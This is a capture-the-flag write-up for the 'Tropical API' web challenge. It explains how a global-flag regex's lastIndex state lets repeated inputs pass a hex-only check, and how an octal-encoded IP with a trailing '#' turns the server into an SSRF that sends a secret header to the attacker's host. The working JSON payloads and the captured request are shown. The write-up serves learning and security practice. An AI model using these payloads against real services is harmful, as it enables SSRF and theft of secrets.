<hr />

<h2>description: JavaScript Regex Shenanigans</h2>

<h1>Tropical API</h1>

<h2>Challenge</h2>

<p>{% hint style="info" %}
Web, 23 Solves
{% endhint %}</p>

<blockquote>
  <p>This internal API was accidentally exposed to the public. Fortunately, the developer left a backup of the backend source code for us.</p>
  
  <p>User input appears to be properly validated. Can you find a way to get the flag?</p>
</blockquote>

<p>```javascript
import express from 'express';
import fetch from 'node-fetch';</p>

<p>if (!process.env.FLAG) {
    throw new Error('FLAG must be set');
}</p>

<p>const server = express();</p>

<p>server.use(express.static('public'));</p>

<p>server.post("/ping", express.json(), async function (req, res) {
    const errors = [];
    const noneHexRegex = /[^0-9a-f]/g;
    const fqdns = Array.isArray(req.body.fqdn) ? req.body.fqdn : [req.body.fqdn];</p>

<pre><code>if (fqdns.length &gt;= 5) {
    return res.status(400).json({ error: 'Too many FQDNs' });
}

for (let fqdn of fqdns) {
    if (typeof fqdn !== "string") {
        errors.push(`${fqdn} must be a string`);
        continue;
    }

    if (noneHexRegex.test(fqdn)) {
        errors.push(`${fqdn} should only contain hexadecimal characters`);
        continue;
    }

    let buf = Buffer.from(fqdn, "hex");

    if (buf.length !== 16) {
        errors.push(`${fqdn} must be 16 bytes long`);
        continue;
    }

    const url = `http://${fqdn}.ping-proxy/ping`;

    try {
        await fetch(url, {
            headers: {
                'X-FLAG': process.env.FLAG
            }
        });
    } catch (err) {
        errors.push(err.message);
    }
}

if (errors.length &gt; 0) {
    res.status(500);
}

res.json({ errors });
</code></pre>

<p>});</p>

<p>server.listen(1337, function (err) {
    if (err) {
        throw err;
    }
    console.log('Server is up and running on http://localhost:1337');
});</p>

<p>```</p>

<h2>Solution</h2>

<p>The premise of this challenge was simple - we had "SSRF-as-a-service", and the flag is in one of the request headers. We need to control <code>fqdn</code> to make a request to an arbitrary URL, where we are listening for a request.</p>

<p>The problem is that there is a very restrictive regex check that only allows us to use hexadecimal characters in the <code>fqdn</code>.</p>

<p>```javascript
const noneHexRegex = /[^0-9a-f]/g;</p>

<p>...</p>

<p>if (noneHexRegex.test(fqdn)) {
    errors.push(<code>${fqdn} should only contain hexadecimal characters</code>);
    continue;
}
```</p>

<p>If we look at the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test">documantation</a> for <code>RegExp.prototype.test()</code>, however, we would notice a very interesting behaviour when <code>test()</code> is used with a regex containing the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#advanced_searching_with_flags_2">global flag</a>.</p>

<p><img src="../../.gitbook/assets/Screenshot 2022-07-05 at 4.13.30 PM.png" alt="" /></p>

<p>This means that if the regex is being tested <em>multiple</em> times for bad characters, each time the string is only searched from the previously-found index onwards.</p>

<p>This, combined with the fact that we are allowed to provide multiple <code>fqdn</code>s, means that we can bypass the restrictions by simply submitting the same payload multiple times. For instance, if we use the following:</p>

<p><code>json
{
    "fqdn":[
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax"
    ]
}
</code></p>

<p>The first time the regex is tested, <code>lastIndex</code> is set to 32 since the disallowed character, <code>x</code>, was found at the end of the string. The second time the regex is tested, no match would be found and <code>test()</code> would return <code>false</code>.</p>

<p>Great! We can bypass the regex restriction. The next problem is that when converted into a <code>Buffer</code> from hex, the length of the <code>Buffer</code> must be 16. This means we need a minimum of 32 characters in our <code>fqdn</code>.</p>

<p>```javascript
let buf = Buffer.from(fqdn, "hex");</p>

<p>if (buf.length !== 16) {
    errors.push(<code>${fqdn} must be 16 bytes long</code>);
    continue;
}
```</p>

<p>Luckily, the <code>Buffer</code> stops when the first non-hexadecimal character is encountered, so it's fine to have non-hexadecimal characters after the first 32 bytes.</p>

<p>But how do we provide a URL that starts with 32 bytes of hexadecimal characters? My teammate Enyei found this very helpful <a href="https://www.hacksparrow.com/networking/many-faces-of-ip-address.html">article</a> that describes the various ways that IP addresses can be represented.</p>

<p>In this case, the octal notation proved very helpful. We could lead with as many <code>0</code>s as we want, which is a hexadecimal character. Then, we can use any <a href="https://www.browserling.com/tools/ip-to-oct">octal IP address converter</a> to convert our public IP address to octal form. For example:</p>

<p><code>json
{
    "fqdn":[
        "000000000000000000000002730000424#",
        "000000000000000000000002730000424#"
    ]
}
</code></p>

<p>The ending <code>#</code> will turn the trailing <code>.ping-proxy/ping</code> into a URL fragment, making the final URL simply that of our public IP address.</p>

<p>This allows us to receive the request and get our flag.</p>

<p><code>http
GET / HTTP/1.1
accept: */*
accept-encoding: gzip, deflate, br
connection: close
user-agent: node-fetch
x-flag: BSidesTLV2022{JavAsCriPtMaStEr}
Host: REDACTED
</code></p>
